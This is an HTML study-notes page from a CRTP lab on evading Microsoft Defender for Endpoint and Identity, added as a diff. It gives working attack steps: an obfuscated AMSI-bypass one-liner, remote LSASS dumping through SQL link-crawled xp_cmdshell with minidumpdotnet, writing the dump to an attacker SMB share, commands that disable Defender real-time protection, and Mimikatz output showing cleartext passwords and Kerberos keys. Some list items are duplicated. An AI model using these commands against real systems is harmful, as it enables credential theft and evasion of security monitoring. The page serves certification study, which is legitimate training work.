@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MDE/MDI Bypass - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="active">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">MDE/MDI Bypass</header>
+        <section class="about-text">
+          <div class="notion-content">
+<h3>Microsoft Defender for Identity (MDI) Bypass</h3>
+<p>Microsoft Defender for Identity (formerly known as Azure Advanced Threat Protection or Azure ATP) is a security solution that helps detect and investigate advanced threats, compromised identities, and malicious insider actions directed at your organization. </p>
+<p>Here are some common techniques used to bypass MDI:</p>
+<ul>
+<li>
+<p>Disabling Security Tools: Attackers may attempt to disable or tamper with MDI sensors or agents installed on domain controllers to evade detection.</p>
+</li>
+<li>
+<p>Living off the Land Binaries (LOLBins): Utilizing built-in Windows tools (like net.exe, powershell.exe, wmi.exe) to perform malicious activities that might go undetected by MDI.</p>
+</li>
+<li>
+<p>Encrypted Communication: Encrypting malicious traffic to prevent network-based detection. Attackers often use SSL/TLS or other encryption methods to hide their activities.</p>
+</li>
+<li>
+<p>Custom Tools: Developing custom tools that do not trigger MDI's detection mechanisms. For instance, using bespoke malware or tools that do not match known attack patterns.</p>
+</li>
+<li>
+<p>Credential Theft: Stealing credentials and using legitimate accounts to perform actions. This technique can make malicious activities appear legitimate.</p>
+</li>
+</ul>
+<h3>Microsoft Defender for Endpoint (MDE) Bypass</h3>
+<p>Microsoft Defender for Endpoint (formerly known as Microsoft Defender Advanced Threat Protection or Microsoft Defender ATP) is a platform designed to help enterprises prevent, detect, investigate, and respond to advanced threats. Techniques for bypassing MDE include:</p>
+<ul>
+<li>
+<p>Fileless Malware: Utilizing fileless malware that operates in-memory and does not leave a footprint on the disk, making it harder for MDE to detect.</p>
+</li>
+<li>
+<p>Obfuscation: Obfuscating code or scripts to evade signature-based detection. This can involve encoding scripts or using various obfuscation tools to hide malicious code.</p>
+</li>
+<li>
+<p>Disabling Security Features: Attempting to disable MDE’s features such as real-time protection, cloud-delivered protection, and tamper protection.</p>
+</li>
+<li>
+<p>Privilege Escalation: Gaining higher privileges to disable or bypass security controls. This can involve exploiting vulnerabilities to elevate privileges.</p>
+</li>
+<li>
+<p>Code Injection: Injecting malicious code into legitimate processes to blend in with normal activity. Techniques like Process Hollowing or DLL Injection are often used.</p>
+</li>
+<li>
+<p>Command and Control (C2) Communication: Using sophisticated C2 channels that mimic legitimate traffic patterns to avoid detection. This might include using well-known services like Google Drive or Dropbox for C2 communication.</p>
+</li>
+</ul>
+<p>In this lab we will try to demonstrate some techniques to avoid being caught by <strong>MDI/MDE</strong>s in the network or in the target we are.</p>
+<p>Assuming that we already have Domain Admin or even Enterprise Admin privilege, we have the ability to run commands as SYSTEM or an Administrator. 
+This is the perfect scenario to perform an LSASS dump to further gain persistent credential access to the machine.</p>
+<p>To dump the memory of LSASS process, we can begin by leveraging <strong>minidumpdotnet</strong> as it is undetected by AV/MDE since it uses a custom implementation of the MiniDumpWriteDump() API call</p>
+<h3>MiniDumpDotNet</h3>
+<p>MiniDumpDotNet is a tool designed to create memory dumps of processes. Memory dumps are snapshots of the memory of a running process, which can include sensitive information like credentials, encryption keys, or other secrets. These dumps are often used by attackers to extract such sensitive information.</p>
+<h3>MiniDumpWriteDump() API</h3>
+<p>The <code>MiniDumpWriteDump()</code> function is a Windows API call provided by the <code>DbgHelp.dll</code> library. It allows developers to create a minidump of a process's memory. Minidumps can be used for debugging purposes or, in the context of an attack, to extract sensitive data from the memory of targeted applications, such as LSASS (Local Security Authority Subsystem Service) which handles user authentication.</p>
+<h3>Custom Implementation</h3>
+<p>Using a "custom implementation" of the <code>MiniDumpWriteDump()</code> API call means that MiniDumpDotNet does not use the standard library directly. Instead, it implements its own version of the function, which can vary in several ways:</p>
+<ul>
+<li>
+<p>Avoiding Detection: By not using the standard DbgHelp.dll, the tool can avoid triggering signatures that AV/MDE solutions may have for the standard function call. Many security solutions monitor calls to MiniDumpWriteDump() as it is commonly used by malicious tools to dump LSASS memory.</p>
+</li>
+<li>
+<p>Customization: The custom implementation can include modifications that make the memory dumping process stealthier or more efficient, further reducing the chances of detection.</p>
+</li>
+</ul>
+<h3>4.Bypassing AV/MDE</h3>
+<p>AV and MDE solutions often rely on signature-based detection methods, heuristic analysis, and behavior monitoring to identify malicious activities. 
+However, custom implementations of standard functions can evade these detection mechanisms by:</p>
+<ul>
+<li>
+<p>Signature Evasion: Since the custom implementation does not match known signatures, it is less likely to be flagged.</p>
+</li>
+<li>
+<p>Behavioral Evasion: The custom implementation can mask the behavior that typically triggers alerts in security solutions.</p>
+</li>
+</ul>
+<h3>Detailed Example: MiniDumpDotNet in Action</h3>
+<ol>
+<li>Implementation:</li>
+<li>A custom tool like MiniDumpDotNet would implement its own version of theMiniDumpWriteDump()API. This can be done by directly interfacing with the necessary system calls and memory management functions to create a minidump.</li>
+<li>
+<p>The custom implementation may use direct system calls, inline assembly, or other techniques to perform the memory dump without invokingDbgHelp.dll.</p>
+</li>
+<li>
+<p>A custom tool like MiniDumpDotNet would implement its own version of the MiniDumpWriteDump() API. This can be done by directly interfacing with the necessary system calls and memory management functions to create a minidump.</p>
+</li>
+<li>
+<p>The custom implementation may use direct system calls, inline assembly, or other techniques to perform the memory dump without invoking DbgHelp.dll.</p>
+</li>
+<li>
+<p>Execution:</p>
+</li>
+<li>The attacker runs MiniDumpDotNet on the target system. It targets a process like LSASS to create a memory dump.</li>
+<li>
+<p>The custom implementation ensures that the dump process is not detected by AV/MDE by avoiding common detection points, such as specific API calls or memory access patterns.</p>
+</li>
+<li>
+<p>The attacker runs MiniDumpDotNet on the target system. It targets a process like LSASS to create a memory dump.</p>
+</li>
+<li>
+<p>The custom implementation ensures that the dump process is not detected by AV/MDE by avoiding common detection points, such as specific API calls or memory access patterns.</p>
+</li>
+<li>
+<p>Extraction:</p>
+</li>
+<li>
+<p>The memory dump is then analyzed to extract sensitive information, such as passwords or tokens. Tools like Mimikatz can be used to process the dump and retrieve this data.</p>
+</li>
+<li>
+<p>The memory dump is then analyzed to extract sensitive information, such as passwords or tokens. Tools like Mimikatz can be used to process the dump and retrieve this data.</p>
+</li>
+</ol>
+<h1>Tools Transfer and Execution</h1>
+<p>Downloads over HTTP increase the chances of detection chained with other risky actions, so we perform execution from an SMB share instead of HTTP.</p>
+<p>On our attacking machine(Windows), let’s create an SMB share called <strong>MyShares</strong> with the following configurations and permissions for the share:</p>
+<p><code>Allow Everyone 'Read &amp; Write'</code></p>
+<p>Note: I’m adding this new <strong>MyShares</strong> shared folder in <code>C:\Users\student451\MyShares</code>.</p>
+<p>Now let’s add these 2 tools into that shared folder.
+<code>copy C:\AD\Tools\minidumpdotnet.exe \\DCORP-STD451/MyShares</code></p>
+<p><code>copy C:\AD\Tools\FindLSASSPID.exe \\DCORP-STD451\MyShares</code></p>
+<h2>LSASS DUMP using Custom APIs</h2>
+<p><code>FindLSASSPID.exe</code> is a tool designed to locate and dump the Local Security Authority Subsystem Service (LSASS) process, which is responsible for managing Windows security features such as authentication, authorization, and credential storage. Here's a detailed overview of the tool and its functionality:</p>
+<h3>Functionality</h3>
+<p><code>FindLSASSPID.exe</code> is a command-line utility that uses the Windows API to find the process ID (PID) of the LSASS process and then performs a memory dump of the process using the <code>MiniDumpWriteDump</code> function. This allows the tool to capture the LSASS process's memory, which can be useful for forensic analysis, debugging, or other purposes.</p>
+<h3>Code Structure</h3>
+<p>The tool's code is structured around the following key components:</p>
+<ol>
+<li>
+<p>Process Snapshot: The tool uses the CreateToolhelp32Snapshot function to create a snapshot of all running processes. This allows it to iterate through the list of processes and find the LSASS process.</p>
+</li>
+<li>
+<p>LSASS PID Identification: The tool uses the Process32First and Process32Next functions to iterate through the list of processes and identify the LSASS process by its executable name (lsass.exe).</p>
+</li>
+<li>
+<p>Process Handle: Once the LSASS process is identified, the tool opens a handle to the process using the OpenProcess function with the PROCESS_ALL_ACCESS rights.</p>
+</li>
+<li>
+<p>MiniDumpWriteDump: The tool uses the MiniDumpWriteDump function to create a minidump of the LSASS process. This function writes the process's memory to a file specified by the user.</p>
+</li>
+</ol>
+<h3>Usage</h3>
+<p>To use <code>FindLSASSPID.exe</code>, you need to compile the code and run it from the command line. The tool takes no command-line arguments and simply outputs the LSASS process's PID to the console. You can then use this PID to perform further actions, such as creating a minidump of the process.</p>
+<h3>Limitations</h3>
+<p>While <code>FindLSASSPID.exe</code> is a useful tool for finding and dumping the LSASS process, it has some limitations:</p>
+<ol>
+<li>
+<p>AV/EDR Detection: The tool may be detected by antivirus (AV) or endpoint detection and response (EDR) systems, which could prevent it from running successfully.</p>
+</li>
+<li>
+<p>System Privileges: The tool requires system privileges to run, which can be a challenge in certain environments.</p>
+</li>
+<li>
+<p>Memory Dump Size: The size of the memory dump created by the tool can be large, which may require significant storage space.</p>
+</li>
+</ol>
+<p>A good bypass for the tool not being detected it to call and execute the tools remotely from our attacking machine using the shared file we created earlier.</p>
+<p>Let’s begin by performing SQL crawl <code>xp_cmdshell</code> execution on EU-SQL30 to enumerate the LSASS PID using FindLSASSPID.exe.
+Using PowerShell session let’s also use InvisiShell and import PowerUpSQL.</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
+</code></pre></div>
+
+<p>Now let’s query the LSASS PID running in EU-SQL-30.</p>
+<p><code>. .\PowerUpSQL.ps1</code></p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\DCORP-STD451\MyShares\FindLSASSPID.exe''' -QueryTarget EU-SQL30</code></p>
+<p>As we can see above, we were able to gather the <strong>EU-SQL30</strong> LSASS Process ID (<code>716</code>).</p>
+<p>To break a detection chain, let’s run some benign queries first. In case of MDE,  waiting for about 10 minutes also helps avoiding detection.
+<code>Get-SQLServerLinkCrawl -Instance DCORP-MSSQL -Query 'Select @@version' -QueryTarget EU-SQL-30</code></p>
+<p>Above you can see that our query had no return output. but it’s OK, we did it just to try to avoid some suspicious detection on MDE/MDI side.</p>
+<p>We can now perform an LSASS dump using the <code>minidumpdotnet</code> tool and save it to the studentsharex.
+NOTE: Performing an LSASS dump directly on disk on EU-SQL can cause the <code>.dmp</code> file to be corrupted as EDRs can sometimes mangle the <code>.dmp</code> file when written on disk.</p>
+<p>I’ll be using  the name <strong>My_Excel.dmp</strong> for my dump file to avoid any suspicious here HAHA.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\DCORP-STD451.dollarcorp.moneycorp.local\MyShares\minidumpdotnet.exe 716 \\DCORP-STD451.dollarcorp.moneycorp.local\MyShares\My_Excel.dmp ''' -QueryTarget EU-SQL30</code></p>
+<p>Please notice that our query won’t give us any output in <code>CustomQuery</code>… But we can check the .dmp file after  +- 10 minutes after executing the <code>minidumpdotnet</code> query.</p>
+<p>Let’s perform another benign query for safe measure to break any detection chain.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget EU-SQL30</code></p>
+<p>After some time, let’s say plus minus 8/10 minutes if we check out shared folder, we will see that our <code>.dmp</code> file is in the share, it contains round 10MB.</p>
+<p>Back on our attacking machine and also containing the <code>.dmp</code> file, we can begin to parse the exfiltrated LSASS minidump (<code>My_Excel.dmp</code>) using Mimikatz.</p>
+<p>Before using Mimikatz, open cmdlet as Administrator and also check if Defender is enabled, if YES, then disabled it. 
+After that you can continue.</p>
+<h3>Disable RealTime Defender using an Admin Account</h3>
+<p><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></p>
+<p><code>Set-MpPreference -DisableIOAVProtection $true</code></p>
+<p><code>set-MpPreference -DisableAutoExclusions $true</code></p>
+<p>Now that we have disabled Firewall, we can use Mimikatz.exe to dump all the credentials from our <code>.dmp</code> file.</p>
+<p><code>C:\AD\Tools&gt;C:\AD\Tools\mimikatz.exe "sekurlsa::minidump \\DCORP-STD451\MyShares\My_Excel.dmp" "sekurlsa::ekeys" "exit"</code></p>
+<div class="highlight"><pre><span></span><code>  <span class="p">.</span><span class="c">#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span>
+ <span class="p">.</span><span class="c">## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span>
+ <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">&#39;## v ##&#39;</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="p">.</span><span class="n">letoux</span><span class="nv">@gmail</span><span class="p">.</span><span class="n">com</span> <span class="p">)</span>
+  <span class="s1">&#39;#####&#39;</span>        <span class="p">&gt;</span> <span class="n">https</span><span class="p">://</span><span class="n">pingcastle</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span> <span class="n">https</span><span class="p">://</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="n">com</span> <span class="p">***/</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># sekurlsa::minidump \\DCORP-STD451\MyShares\My_Excel.dmp</span>
+<span class="k">Switch</span> <span class="n">to</span> <span class="n">MINIDUMP</span> <span class="p">:</span> <span class="s1">&#39;\\DCORP-STD451\MyShares\My_Excel.dmp&#39;</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># sekurlsa::ekeys</span>
+<span class="n">Opening</span> <span class="p">:</span> <span class="s1">&#39;\\DCORP-STD451\MyShares\My_Excel.dmp&#39;</span> <span class="n">file</span> <span class="k">for</span> <span class="n">minidump</span><span class="p">...</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">2954388</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">002d1494</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="n">4</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">UMFD</span><span class="p">-</span><span class="n">4</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">Font</span> <span class="n">Driver</span> <span class="n">Host</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">6</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span> <span class="n">7</span><span class="p">:</span><span class="n">43</span><span class="p">:</span><span class="n">47</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">96</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">4</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">eu</span><span class="p">.</span><span class="n">eurocorp</span><span class="p">.</span><span class="n">local</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">F</span><span class="p">=!</span><span class="n">vGF</span><span class="p">(]</span><span class="n">A4Z_</span><span class="p">-;</span><span class="n">Bb</span><span class="p">^</span><span class="n">v</span><span class="p">&gt;</span><span class="n">j</span><span class="p">*</span><span class="n">WUfYrEx</span><span class="p">=</span><span class="n">YePp6CT3</span><span class="s1">&#39;9j+woO)VF784p[ai\%wH!p2.[rLV+YNY,:*7.MCuFIh1WV;u:/^;\2nHV+#v.lw.V+/[WHYY*HWL+O/hgV</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+<span class="s1">           aes128_hmac       cacc31c9e0264f6a09a4211e1e1c283d</span>
+<span class="s1">           rc4_hmac_nt       e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old      e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_md4           e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_nt_exp   e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old_exp  e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="s1">Authentication Id : 0 ; 1600615 (00000000:00186c67)</span>
+<span class="s1">Session           : Interactive from 0</span>
+<span class="s1">User Name         : dbadmin</span>
+<span class="s1">Domain            : EU</span>
+<span class="s1">Logon Server      : EU-DC</span>
+<span class="s1">Logon Time        : 2/21/2024 7:09:58 AM</span>
+<span class="s1">SID               : S-1-5-21-3665721161-1121904292-1901483061-1105</span>
+
+<span class="s1">         * Username : dbadmin</span>
+<span class="s1">         * Domain   : eu.eurocorp.local</span>
+<span class="s1">         * Password : *AnotherDBAnotherTreasure22</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</span>
+<span class="s1">           aes128_hmac       2a2b0dd88240bdee8f6dbf4136f847cf</span>
+<span class="s1">           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_md4           0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old_exp  0553b02b95f64f7a3c27b9029d105c27</span>
+
+<span class="s1">Authentication Id : 0 ; 666169 (00000000:000a2a39)</span>
+<span class="s1">Session           : Interactive from 0</span>
+<span class="s1">User Name         : dbadmin</span>
+<span class="s1">Domain            : EU</span>
+<span class="s1">Logon Server      : EU-DC</span>
+<span class="s1">Logon Time        : 2/21/2024 6:34:32 AM</span>
+<span class="s1">SID               : S-1-5-21-3665721161-1121904292-1901483061-1105</span>
+
+<span class="s1">         * Username : dbadmin</span>
+<span class="s1">         * Domain   : EU.EUROCORP.LOCAL</span>
+<span class="s1">         * Password : (null)</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</span>
+<span class="s1">           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_md4           0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old_exp  0553b02b95f64f7a3c27b9029d105c27</span>
+
+<span class="s1">Authentication Id : 0 ; 996 (00000000:000003e4)</span>
+<span class="s1">Session           : Service from 0</span>
+<span class="s1">User Name         : EU-SQL30$</span>
+<span class="s1">Domain            : EU</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 2/21/2024 6:33:57 AM</span>
+<span class="s1">SID               : S-1-5-20</span>
+
+<span class="s1">         * Username : eu-sql30$</span>
+<span class="s1">         * Domain   : EU.EUROCORP.LOCAL</span>
+<span class="s1">         * Password : (null)</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       d35bc0e8887fa1466f369b7555faf458ef366252520ac1abbac473a1d1f376d8</span>
+<span class="s1">           rc4_hmac_nt       e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old      e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_md4           e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_nt_exp   e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old_exp  e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="s1">Authentication Id : 0 ; 3528739 (00000000:0035d823)</span>
+<span class="s1">Session           : Interactive from 7</span>
+<span class="s1">User Name         : UMFD-7</span>
+<span class="s1">Domain            : Font Driver Host</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 6/18/2024 7:44:49 AM</span>
